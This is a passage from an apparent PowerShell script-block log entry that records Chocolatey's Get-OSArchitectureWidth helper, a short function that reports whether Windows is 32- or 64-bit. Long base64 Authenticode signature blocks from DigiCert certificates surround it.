MJPzyWHM0AjMa+xiQpGsAsDvpPCJEY93AgMBAAGjggM1MIIDMTAOBgNVHQ8BAf8E # BAMCB4AwDAYDVR0TAQH/BAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDCCAb8G # A1UdIASCAbYwggGyMIIBoQYJYIZIAYb9bAcBMIIBkjAoBggrBgEFBQcCARYcaHR0 # cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzCCAWQGCCsGAQUFBwICMIIBVh6CAVIA # QQBuAHkAIAB1AHMAZQAgAG8AZgAgAHQAaABpAHMAIABDAGUAcgB0AGkAZgBpAGMA # YQB0AGUAIABjAG8AbgBzAHQAaQB0AHUAdABlAHMAIABhAGMAYwBlAHAAdABhAG4A # YwBlACAAbwBmACAAdABoAGUAIABEAGkAZwBpAEMAZQByAHQAIABDAFAALwBDAFAA # UwAgAGEAbgBkACAAdABoAGUAIABSAGUAbAB5AGkAbgBnACAAUABhAHIAdAB5ACAA # QQBnAHIAZQBlAG0AZQBuAHQAIAB3AGgAaQBjAGgAIABsAGkAbQBpAHQAIABsAGkA # YQBiAGkAbABpAHQAeQAgAGEAbgBkACAAYQByAGUAIABpAG4AYwBvAHIAcABvAHIA # YQB0AGUAZAAgAGgAZQByAGUAaQBuACAAYgB5ACAAcgBlAGYAZQByAGUAbgBjAGUA # LjALBglghkgBhv1sAxUwHwYDVR0jBBgwFoAUFQASKxOYspkH7R7for5XDStnAs0w # HQYDVR0OBBYEFGFaTSS2STKdSip5GoNL9B6Jwcp9MH0GA1UdHwR2MHQwOKA2oDSG # Mmh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJRENBLTEu # Y3JsMDigNqA0hjJodHRwOi8vY3JsNC5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1 # cmVkSURDQS0xLmNybDB3BggrBgEFBQcBAQRrMGkwJAYIKwYBBQUHMAGGGGh0dHA6 # Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBBBggrBgEFBQcwAoY1aHR0cDovL2NhY2VydHMu # ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEQ0EtMS5jcnQwDQYJKoZIhvcN # AQEFBQADggEBAJ0lfhszTbImgVybhs4jIA+Ah+WI//+x1GosMe06FxlxF82pG7xa # FjkAneNshORaQPveBgGMN/qbsZ0kfv4gpFetW7easGAm6mlXIV00Lx9xsIOUGQVr # NZAQoHuXx/Y/5+IRQaa9YtnwJz04HShvOlIJ8OxwYtNiS7Dgc6aSwNOOMdgv420X # Ewbu5AO2FKvzj0OncZ0h3RTKFV2SQdr5D4HRmXQNJsQOfxu19aDxxncGKBXp2JPl # VRbwuwqrHNtcSCdmyKOLChzlldquxC5ZoGHd2vNtomHpigtt7BIYvfdVVEADkitr # wlHCCkivsNRu4PQUCjob4489yq9qjXvc2EQwggbNMIIFtaADAgECAhAG/fkDlgOt # 6gAK6z8nu7obMA0GCSqGSIb3DQEBBQUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0wNjExMTAwMDAwMDBa # Fw0yMTExMTAwMDAwMDBaMGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNVBAMTGERpZ2lD # ZXJ0IEFzc3VyZWQgSUQgQ0EtMTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC # ggEBAOiCLZn5ysJClaWAc0Bw0p5WVFypxNJBBo/JM/xNRZFcgZ/tLJz4FlnfnrUk # FcKYubR3SdyJxArar8tea+2tsHEx6886QAxGTZPsi3o2CAOrDDT+GEmC/sfHMUiA # fB6iD5IOUMnGh+s2P9gww/+m9/uizW9zI/6sVgWQ8DIhFonGcIj5BZd9o8dD3QLo # Oz3tsUGj7T++25VIxO4es/K8DCuZ0MZdEkKB4YNugnM/JksUkK5ZZgrEjb7Szgau # rYRvSISbT0C58Uzyr5j79s5AXVz2qPEvr+yJIvJrGGWxwXOt1/HYzx4KdFxCuGh+ # t9V3CidWfA9ipD8yFGCV/QcEogkCAwEAAaOCA3owggN2MA4GA1UdDwEB/wQEAwIB # hjA7BgNVHSUENDAyBggrBgEFBQcDAQYIKwYBBQUHAwIGCCsGAQUFBwMDBggrBgEF # BQcDBAYIKwYBBQUHAwgwggHSBgNVHSAEggHJMIIBxTCCAbQGCmCGSAGG/WwAAQQw # ggGkMDoGCCsGAQUFBwIBFi5odHRwOi8vd3d3LmRpZ2ljZXJ0LmNvbS9zc2wtY3Bz # LXJlcG9zaXRvcnkuaHRtMIIBZAYIKwYBBQUHAgIwggFWHoIBUgBBAG4AeQAgAHUA # cwBlACAAbwBmACAAdABoAGkAcwAgAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAGMA # bwBuAHMAdABpAHQAdQB0AGUAcwAgAGEAYwBjAGUAcAB0AGEAbgBjAGUAIABvAGYA # IAB0AGgAZQAgAEQAaQBnAGkAQwBlAHIAdAAgAEMAUAAvAEMAUABTACAAYQBuAGQA # IAB0AGgAZQAgAFIAZQBsAHkAaQBuAGcAIABQAGEAcgB0AHkAIABBAGcAcgBlAGUA # bQBlAG4AdAAgAHcAaABpAGMAaAAgAGwAaQBtAGkAdAAgAGwAaQBhAGIAaQBsAGkA # dAB5ACAAYQBuAGQAIABhAHIAZQAgAGkAbgBjAG8AcgBwAG8AcgBhAHQAZQBkACAA # aABlAHIAZQBpAG4AIABiAHkAIAByAGUAZgBlAHIAZQBuAGMAZQAuMAsGCWCGSAGG # /WwDFTASBgNVHRMBAf8ECDAGAQH/AgEAMHkGCCsGAQUFBwEBBG0wazAkBggrBgEF # BQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEMGCCsGAQUFBzAChjdodHRw # Oi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0Eu # Y3J0MIGBBgNVHR8EejB4MDqgOKA2hjRodHRwOi8vY3JsMy5kaWdpY2VydC5jb20v # RGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMDqgOKA2hjRodHRwOi8vY3JsNC5k # aWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMB0GA1UdDgQW # BBQVABIrE5iymQftHt+ivlcNK2cCzTAfBgNVHSMEGDAWgBRF66Kv9JLLgjEtUYun # pyGd823IDzANBgkqhkiG9w0BAQUFAAOCAQEARlA+ybcoJKc4HbZbKa9Sz1LpMUer # Vlx71Q0LQbPv7HUfdDjyslxhopyVw1Dkgrkj0bo6hnKtOHisdV0XFzRyR4WUVtHr # uzaEd8wkpfMEGVWp5+Pnq2LN+4stkMLA0rWUvV5PsQXSDj0aqRRbpoYxYqioM+Sb # OafE9c4deHaUJXPkKqvPnHZL7V/CSxbkS3BMAIke/MV5vEwSV/5f4R68Al2o/vsH # OE8Nxl2RuQ9nRc3Wg+3nkg2NsWmMT/tZ4CMP0qquAHzunEIOz5HXJ7cW7g/DvXwK # oO4sCFWFIrjrGBpN/CohrUkxg0eVd3HcsRtLSxwQnHcUwZ1PL1qVCCkQJjGCBEww # ggRIAgEBMIGGMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMx # GTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0IFNI # QTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0ECEAf7Rdn3C1UpA2CXtPThQ3Aw # DQYJYIZIAWUDBAIBBQCggYQwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZBgkq # hkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGC # NwIBFTAvBgkqhkiG9w0BCQQxIgQgP758QKNsTW8rWPEwFItvwYU40LERXrsVnMIx # EW0I+YIwDQYJKoZIhvcNAQEBBQAEggEAnYGeuRcmWugYjQnOQJRgsG/fTDMry1sv # PxtTaoIGjlW8iPLJk58sQdyQxEfkcsNe58bwKnvB8B0kvMol/AES2Esz4QYX/A7Z # iXdB1XxsQVio7B8XsQdGmePNEeIda18ExPkIyDnKD2grpDiFz8vaQp8CsZZcfZzc # fbM5qcUF5HFCdTI4gFxb3NXduCk7mOIhDajJH4cVpdz0N1FfVuTR+sDErHUS72vd # BQtW/gOPSA0JIetcmJrqvRXdx3n0Sp32kBxn7XyypO1L3PxBgZwW94ekQDIe5v3F # SKlmv2E38T0tU5/IUX2PNV3vMKWHs3E7Me6r6+h1TcHeXhTrRrV586GCAg8wggIL # BgkqhkiG9w0BCQYxggH8MIIB+AIBATB2MGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNV # BAMTGERpZ2lDZXJ0IEFzc3VyZWQgSUQgQ0EtMQIQAwGaAjr/WLFr1tXq5hfwZjAJ # BgUrDgMCGgUAoF0wGAYJKoZIhvcNAQkDMQsGCSqGSIb3DQEHATAcBgkqhkiG9w0B # CQUxDxcNMTkwMzE1MTc1NjU2WjAjBgkqhkiG9w0BCQQxFgQUQekAipyHZj/2ib13 # V41/KGW2HqcwDQYJKoZIhvcNAQEBBQAEggEAhdsnEFLCzzvdikeGGRpCELtJtKGY # dVO1NWtm4UqWDlCg6n+aWm0/81MWDOkyzeXzYuWeBK5dU2dvLrV3vtlKJvEDJ3p3 # caImQHht9OvP7kMWRJ9YuH5j+Hh2StWpsOxKWEQjUawkin2pJSOE7oFNte8rA0zB # fL9uclSP1n20elP+4Uf3NQASJdjcLypcwkOOk0D+mWjFI0eFTxc5WY6/u4u8hLZu # XS0q7rRIBi8wQgTtZQ63WQwkgl00kUpy1SdFehmRfbq2onSw8LbJQh6ZI/Gt477b # FWOp8lN75cQHTfqF31fPr/PDP0LPeVn0XKEsemZZEqhbWTQE/Pg4S+QHeA== # SIG # End signature block","MessageNumber: 1 ¦ MessageTotal: 1 ¦ Path: C:\ProgramData\chocolatey\helpers\functions\Get-OSArchitectureWidth.ps1 ¦ ScriptBlockId: 6bd15457-f8d0-45bd-a29d-6018ae2e2cca ¦ ScriptBlockText: # Copyright © 2017 Chocolatey Software, Inc. # Copyright © 2015 - 2017 RealDimensions Software, LLC # Copyright © 2011 - 2015 RealDimensions Software, LLC & original authors/contributors from https://github.com/chocolatey/chocolatey # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. function Get-OSArchitectureWidth { <# .SYNOPSIS Get the operating system architecture address width. .DESCRIPTION This will return the system architecture address width (probably 32 or 64 bit). If you pass a comparison, it will return true or false instead of {`32`|`64`}. .NOTES When your installation script has to know what architecture it is run on, this simple function comes in handy. Available as `Get-OSArchitectureWidth` in 0.9.10+. If you need compatibility with pre 0.9.10, please use the alias `Get-ProcessorBits`. .INPUTS None .OUTPUTS None .PARAMETER Compare This optional parameter causes the function to return $true or $false, depending on wether or not the bit width matches. #> param( $compare ) Write-FunctionCallLogMessage -Invocation $MyInvocation -Parameters $PSBoundParameters $bits = 64 if (([System.IntPtr]::Size -eq 4) -and (Test-Path env:\PROCESSOR_ARCHITEW6432)) { $bits = 64 } elseif ([System.IntPtr]::Size -eq 4) { $bits = 32 } # Return bool|int if (""$compare"" -ne '' -and $compare -eq $bits) { return $true } elseif (""$compare"" -ne '') { return $false } else { return $bits } } Set-Alias Get-ProcessorBits Get-OSArchitectureWidth Set-Alias Get-OSBitness Get-OSArchitectureWidth # SIG # Begin signature block # MIIcpwYJKoZIhvcNAQcCoIIcmDCCHJQCAQExDzANBglghkgBZQMEAgEFADB5Bgor # BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG # KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCC+5R24zufGXnsc # mWj/25mf6jwe97cvRY7+8fCOG4I2J6CCF7EwggUwMIIEGKADAgECAhAECRgbX9W7 # ZnVTQ7VvlVAIMA0GCSqGSIb3DQEBCwUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0xMzEwMjIxMjAwMDBa # Fw0yODEwMjIxMjAwMDBaMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lD # ZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwggEiMA0GCSqGSIb3 # DQEBAQUAA4IBDwAwggEKAoIBAQD407Mcfw4Rr2d3B9MLMUkZz9D7RZmxOttE9X/l # qJ3bMtdx6nadBS63j/qSQ8Cl+YnUNxnXtqrwnIal2CWsDnkoOn7p0WfTxvspJ8fT # eyOU5JEjlpB3gvmhhCNmElQzUHSxKCa7JGnCwlLyFGeKiUXULaGj6YgsIJWuHEqH # CN8M9eJNYBi+qsSyrnAxZjNxPqxwoqvOf+l8y5Kh5TsxHM/q8grkV7tKtel05iv+ # bMt+dDk2DZDv5LVOpKnqagqrhPOsZ061xPeM0SAlI+sIZD5SlsHyDxL0xY4PwaLo # LFH3c7y9hbFig3NBggfkOItqcyDQD2RzPJ6fpjOp/RnfJZPRAgMBAAGjggHNMIIB # yTASBgNVHRMBAf8ECDAGAQH/AgEAMA4GA1UdDwEB/wQEAwIBhjATBgNVHSUEDDAK # BggrBgEFBQcDAzB5BggrBgEFBQcBAQRtMGswJAYIKwYBBQUHMAGGGGh0dHA6Ly9v # Y3NwLmRpZ2ljZXJ0LmNvbTBDBggrBgEFBQcwAoY3aHR0cDovL2NhY2VydHMuZGln # aWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEUm9vdENBLmNydDCBgQYDVR0fBHow # eDA6oDigNoY0aHR0cDovL2NybDQuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJl # ZElEUm9vdENBLmNybDA6oDigNoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29tL0Rp # Z2lDZXJ0QXNzdXJlZElEUm9vdENBLmNybDBPBgNVHSAESDBGMDgGCmCGSAGG/WwA # AgQwKjAoBggrBgEFBQcCARYcaHR0cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzAK # BghghkgBhv1sAzAdBgNVHQ4EFgQUWsS5eyoKo6XqcQPAYPkt9mV1DlgwHwYDVR0j # BBgwFoAUReuir/SSy4IxLVGLp6chnfNtyA8wDQYJKoZIhvcNAQELBQADggEBAD7s # DVoks/Mi0RXILHwlKXaoHV0cLToaxO8wYdd+C2D9wz0PxK+L/e8q3yBVN7Dh9tGS # dQ9RtG6ljlriXiSBThCk7j9xjmMOE0ut119EefM2FAaK95xGTlz/kLEbBw6RFfu6 # r7VRwo0kriTGxycqoSkoGjpxKAI8LpGjwCUR4pwUR6F6aGivm6dcIFzZcbEMj7uo # +MUSaJ/PQMtARKUT8OZkDCUIQjKyNookAv4vcn4c10lFluhZHen6dGRrsutmQ9qz # sIzV6Q3d9gEgzpkxYz0IGhizgZtPxpMQBvwHgfqL2vmCSfdibqFT+hKUGIUukpHq # aGxEMrJmoecYpJpkUe8wggU6MIIEIqADAgECAhAH+0XZ9wtVKQNgl7T04UNwMA0G # CSqGSIb3DQEBCwUAMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJ # bmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0 # IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwHhcNMTgwMzMwMDAwMDAw # WhcNMjEwNDE0MTIwMDAwWjB3MQswCQYDVQQGEwJVUzEPMA0GA1UECBMGS2Fuc2Fz # MQ8wDQYDVQQHEwZUb3Bla2ExIjAgBgNVBAoTGUNob2NvbGF0ZXkgU29mdHdhcmUs # IEluYy4xIjAgBgNVBAMTGUNob2NvbGF0ZXkgU29mdHdhcmUsIEluYy4wggEiMA0G # CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4irdLWVJryfKSgPPCyMN+nBmxtZIm # mTBhJMaYVJ6gtfvHcFakH7IC8TcjcEIrkK7wB/2vEJkEqiOTgbVQPZLnfX8ZAxhd # UiJmwQHEiSwLzoo2B35ROQ9qdOsn1bYIEzDpaqm/XwYH925LLpxhr9oCkBNf5dZs # e5bc/s1J5sQ9HRYwpb3MimmNHGpNP/YhjXX/kNFCZIv3mUadFHi+talYIN5dp6ai # /k+qgZeL5klPdmjyIgf3JiDywCf7j5nSbm3sWarYjM5vLe/oD+eK70fez30a17Cy # 97Jtqmdz6WUV1BcbMWeb9b8x369UJq5vt7vGwVFDOeGjwffuVHLRvWLnAgMBAAGj # ggHFMIIBwTAfBgNVHSMEGDAWgBRaxLl7KgqjpepxA8Bg+S32ZXUOWDAdBgNVHQ4E # FgQUqRlYCMLOvsDUS4mx9UA1avD3fvgwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQM # MAoGCCsGAQUFBwMDMHcGA1UdHwRwMG4wNaAzoDGGL2h0dHA6Ly9jcmwzLmRpZ2lj # ZXJ0LmNvbS9zaGEyLWFzc3VyZWQtY3MtZzEuY3JsMDWgM6Axhi9odHRwOi8vY3Js # NC5kaWdpY2VydC5jb20vc2hhMi1hc3N1cmVkLWNzLWcxLmNybDBMBgNVHSAERTBD # MDcGCWCGSAGG/WwDATAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2Vy # dC5jb20vQ1BTMAgGBmeBDAEEATCBhAYIKwYBBQUHAQEEeDB2MCQGCCsGAQUFBzAB # hhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wTgYIKwYBBQUHMAKGQmh0dHA6Ly9j # YWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFNIQTJBc3N1cmVkSURDb2RlU2ln # bmluZ0NBLmNydDAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQA+ddcs # z/NB/+V+AIlUNOVTlGDNCtn1AfvwoRZg9XMmx0/S0EKayfVFTk/x96WMQgxL+/5x # B8Uhw6anlhbPC6bjBcIxRj/IUgR7yJ/NAykyM1x+pWvkPZV3slwe0GDPwhaqGUTU # aG8njO4EvA682a1o7wqQFR1MIltjtuPB2gp311LLxP1k5dpUMgaA0lAfnbRr+5dc # QOFWslkho1eBf0xlzSrhRGPy0e/IYWpl+/sEwXhD88QUkN7dSXY0fMlyGQfn6H4f # ozBQvCk37eoE0uAtkUrWAlJxO/4Esi83ko4hokwQJHaN64/7NdNaKlG3shC9+2QM # kY3j3BU+Ym2GZgtBMIIGajCCBVKgAwIBAgIQAwGaAjr/WLFr1tXq5hfwZjANBgkq # hkiG9w0BAQUFADBiMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5j # MRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYDVQQDExhEaWdpQ2VydCBB # c3N1cmVkIElEIENBLTEwHhcNMTQxMDIyMDAwMDAwWhcNMjQxMDIyMDAwMDAwWjBH # MQswCQYDVQQGEwJVUzERMA8GA1UEChMIRGlnaUNlcnQxJTAjBgNVBAMTHERpZ2lD # ZXJ0IFRpbWVzdGFtcCBSZXNwb25kZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw # ggEKAoIBAQCjZF38fLPggjXg4PbGKuZJdTvMbuBTqZ8fZFnmfGt/a4ydVfiS457V # WmNbAklQ2YPOb2bu3cuF6V+l+dSHdIhEOxnJ5fWRn8YUOawk6qhLLJGJzF4o9GS2 # ULf1ErNzlgpno75hn67z/RJ4dQ6mWxT9RSOOhkRVfRiGBYxVh3lIRvfKDo2n3k5f # 4qi2LVkCYYhhchhoubh87ubnNC8xd4EwH7s2AY3vJ+P3mvBMMWSN4+v6GYeofs/s # jAw2W3rBerh4x8kGLkYQyI3oBGDbvHN0+k7Y/qpA8bLOcEaD6dpAoVk62RUJV5lW # MJPzyWHM0AjMa+xiQpGsAsDvpPCJEY93AgMBAAGjggM1MIIDMTAOBgNVHQ8BAf8E # BAMCB4AwDAYDVR0TAQH/BAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDCCAb8G # A1UdIASCAbYwggGyMIIBoQYJYIZIAYb9bAcBMIIBkjAoBggrBgEFBQcCARYcaHR0 # cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzCCAWQGCCsGAQUFBwICMIIBVh6CAVIA # QQBuAHkAIAB1AHMAZQAgAG8AZgAgAHQAaABpAHMAIABDAGUAcgB0AGkAZgBpAGMA # YQB0AGUAIABjAG8AbgBzAHQAaQB0AHUAdABlAHMAIABhAGMAYwBlAHAAdABhAG4A # YwBlACAAbwBmACAAdABoAGUAIABEAGkAZwBpAEMAZQByAHQAIABDAFAALwBDAFAA # UwAgAGEAbgBkACAAdABoAGUAIABSAGUAbAB5AGkAbgBnACAAUABhAHIAdAB5ACAA # QQBnAHIAZQBlAG0AZQBuAHQAIAB3AGgAaQBjAGgAIABsAGkAbQBpAHQAIABsAGkA # YQBiAGkAbABpAHQAeQAgAGEAbgBkACAAYQByAGUAIABpAG4AYwBvAHIAcABvAHIA # YQB0AGUAZAAgAGgAZQByAGUAaQBuACAAYgB5ACAAcgBlAGYAZQByAGUAbgBjAGUA # LjALBglghkgBhv1sAxUwHwYDVR0jBBgwFoAUFQASKxOYspkH7R7for5XDStnAs0w # HQYDVR0OBBYEFGFaTSS2STKdSip5GoNL9B6Jwcp9MH0GA1UdHwR2MHQwOKA2oDSG # Mmh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJRENBLTEu # Y3JsMDigNqA0hjJodHRwOi8vY3JsNC5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1 # cmVkSURDQS0xLmNybDB3BggrBgEFBQcBAQRrMGkwJAYIKwYBBQUHMAGGGGh0dHA6 # Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBBBggrBgEFBQcwAoY1aHR0cDovL2NhY2VydHMu # ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEQ0EtMS5jcnQwDQYJKoZIhvcN # AQEFBQADggEBAJ0lfhszTbImgVybhs4jIA+Ah+WI//+x1GosMe06FxlxF82pG7xa # FjkAneNshORaQPveBgGMN/qbsZ0kfv4gpFetW7easGAm6mlXIV00Lx9xsIOUGQVr # NZAQoHuXx/Y/5+IRQaa9YtnwJz04HShvOlIJ8OxwYtNiS7Dgc6aSwNOOMdgv420X # Ewbu5AO2FKvzj0OncZ0h3RTKFV2SQdr5D4HRmXQNJsQOfxu19aDxxncGKBXp2JPl # VRbwuwqrHNtcSCdmyKOLChzlldquxC5ZoGHd2vNtomHpigtt7BIYvfdVVEADkitr # wlHCCkivsNRu4PQUCjob4489yq9qjXvc2EQwggbNMIIFtaADAgECAhAG/fkDlgOt # 6gAK6z8nu7obMA0GCSqGSIb3DQEBBQUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0wNjExMTAwMDAwMDBa # Fw0yMTExMTAwMDAwMDBaMGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNVBAMTGERpZ2lD # ZXJ0IEFzc3VyZWQgSUQgQ0EtMTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC # ggEBAOiCLZn5ysJClaWAc0Bw0p5WVFypxNJBBo/JM/xNRZFcgZ/tLJz4FlnfnrUk # FcKYubR3SdyJxArar8tea+2tsHEx6886QAxGTZPsi3o2CAOrDDT+GEmC/sfHMUiA # fB6iD5IOUMnGh+s2P9gww/+m9/uizW9zI/6sVgWQ8DIhFonGcIj5BZd9o8dD3QLo # Oz3tsUGj7T++25VIxO4es/K8DCuZ0MZdEkKB4YNugnM/JksUkK5ZZgrEjb7Szgau # rYRvSISbT0C58Uzyr5j79s5AXVz2qPEvr+yJIvJrGGWxwXOt1/HYzx4KdFxCuGh+ # t9V3CidWfA9ipD8yFGCV/QcEogkCAwEAAaOCA3owggN2MA4GA1UdDwEB/wQEAwIB # hjA7BgNVHSUENDAyBggrBgEFBQcDAQYIKwYBBQUHAwIGCCsGAQUFBwMDBggrBgEF # BQcDBAYIKwYBBQUHAwgwggHSBgNVHSAEggHJMIIBxTCCAbQGCmCGSAGG/WwAAQQw # ggGkMDoGCCsGAQUFBwIBFi5odHRwOi8vd3d3LmRpZ2ljZXJ0LmNvbS9zc2wtY3Bz # LXJlcG9zaXRvcnkuaHRtMIIBZAYIKwYBBQUHAgIwggFWHoIBUgBBAG4AeQAgAHUA # cwBlACAAbwBmACAAdABoAGkAcwAgAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAGMA # bwBuAHMAdABpAHQAdQB0AGUAcwAgAGEAYwBjAGUAcAB0AGEAbgBjAGUAIABvAGYA # IAB0AGgAZQAgAEQAaQBnAGkAQwBlAHIAdAAgAEMAUAAvAEMAUABTACAAYQBuAGQA # IAB0AGgAZQAgAFIAZQBsAHkAaQBuAGcAIABQAGEAcgB0AHkAIABBAGcAcgBlAGUA # bQBlAG4AdAAgAHcAaABpAGMAaAAgAGwAaQBtAGkAdAAgAGwAaQBhAGIAaQBsAGkA # dAB5ACAAYQBuAGQAIABhAHIAZQAgAGkAbgBjAG8AcgBwAG8AcgBhAHQAZQBkACAA # aABlAHIAZQBpAG4AIABiAHkAIAByAGUAZgBlAHIAZQBuAGMAZQAuMAsGCWCGSAGG # /WwDFTASBgNVHRMBAf8ECDAGAQH/AgEAMHkGCCsGAQUFBwEBBG0wazAkBggrBgEF # BQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEMGCCsGAQUFBzAChjdodHRw # Oi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0Eu # Y3J0MIGBBgNVHR8EejB4MDqgOKA2hjRodHRwOi8vY3JsMy5kaWdpY2VydC5jb20v # RGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMDqgOKA2hjRodHRwOi8vY3JsNC5k # aWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMB0GA1UdDgQW # BBQVABIrE5iymQftHt+ivlcNK2cCzTAfBgNVHSMEGDAWgBRF66Kv9JLLgjEtUYun # pyGd823IDzANBgkqhkiG9w0BAQUFAAOCAQEARlA+ybcoJKc4HbZbKa9Sz1LpMUer # Vlx71Q0LQbPv7HUfdDjyslxhopyVw1Dkgrkj0bo6hnKtOHisdV0XFzRyR4WUVtHr # uzaEd8wkpfMEGVWp5+Pnq2LN+4stkMLA0rWUvV5PsQXSDj0aqRRbpoYxYqioM+Sb # OafE9c4deHaUJXPkKqvPnHZL7V/CSxbkS3BMAIke/MV5vEwSV/5f4R68Al2o/vsH # OE8Nxl2RuQ9nRc3Wg+3nkg2NsWmMT/tZ4CMP0qquAHzunEIOz5HXJ7cW7g/DvXwK # oO4sCFWFIrjrGBpN/CohrUkxg0eVd3HcsRtLSxwQnHcUwZ1PL1qVCCkQJjGCBEww # ggRIAgEBMIGGMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMx # GTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0IFNI # QTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0ECEAf7Rdn3C1UpA2CXtPThQ3Aw # DQYJYIZIAWUDBAIBBQCggYQwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZBgkq # hkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGC # NwIBFTAvBgkqhkiG9w0BCQQxIgQgP758QKNsTW8rWPEwFItvwYU40LERXrsVnMIx # EW0I+YIwDQYJKoZIhvcNAQEBBQAEggEAnYGeuRcmWugYjQnOQJRgsG/fTDMry1sv # PxtTaoIGjlW8iPLJk58sQdyQxEfkcsNe58bwKnvB8B0kvMol/AES2Esz4QYX/A7Z # iXdB1XxsQVio7B8XsQdGmePNEeIda18ExPkIyDnKD2grpDiFz8vaQp8CsZZcfZzc # fbM5qcUF5HFCdTI4gFxb3NXduCk7mOIhDajJH4cVpdz0N1FfVuTR+sDErHUS72vd # 